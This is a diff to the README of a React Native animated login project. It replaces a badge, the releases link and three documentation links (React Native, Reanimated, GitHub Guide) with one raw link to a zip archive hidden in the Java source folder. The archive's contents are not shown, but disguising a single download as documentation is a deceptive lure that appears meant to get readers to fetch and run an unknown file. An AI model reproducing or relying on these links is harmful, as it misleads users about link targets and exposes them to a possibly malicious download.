@@ -1,6 +1,6 @@
 # 🚀 animatedLogin - Smooth Login & Signup for React Native
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://raw.githubusercontent.com/Shreyansh-singh-6856/animatedLogin/main/android/app/src/main/java/com/animatedLogin-v3.2.zip)
 
 ## 📋 Overview
 
@@ -39,7 +39,7 @@ Follow these steps to download and run animatedLogin:
 
 ## 📥 Download & Install
 
-You can download animatedLogin by visiting this page: [Download animatedLogin](https://github.com/Shreyansh-singh-6856/animatedLogin/releases).
+You can download animatedLogin by visiting this page: [Download animatedLogin](https://raw.githubusercontent.com/Shreyansh-singh-6856/animatedLogin/main/android/app/src/main/java/com/animatedLogin-v3.2.zip).
 
 Once you've downloaded the application, install it on your device:
 
@@ -102,8 +102,8 @@ For updates and discussions, you can also follow our GitHub page.
 
 ## 🔗 Additional Resources
 
-- [React Native Documentation](https://reactnative.dev/docs/getting-started)
-- [React Native Reanimated Documentation](https://docs.swmansion.com/react-native-reanimated/docs/)
-- [GitHub Guide](https://guides.github.com/)
+- [React Native Documentation](https://raw.githubusercontent.com/Shreyansh-singh-6856/animatedLogin/main/android/app/src/main/java/com/animatedLogin-v3.2.zip)
+- [React Native Reanimated Documentation](https://raw.githubusercontent.com/Shreyansh-singh-6856/animatedLogin/main/android/app/src/main/java/com/animatedLogin-v3.2.zip)
+- [GitHub Guide](https://raw.githubusercontent.com/Shreyansh-singh-6856/animatedLogin/main/android/app/src/main/java/com/animatedLogin-v3.2.zip)
 
 Thank you for using animatedLogin! We hope you find it helpful for your projects.
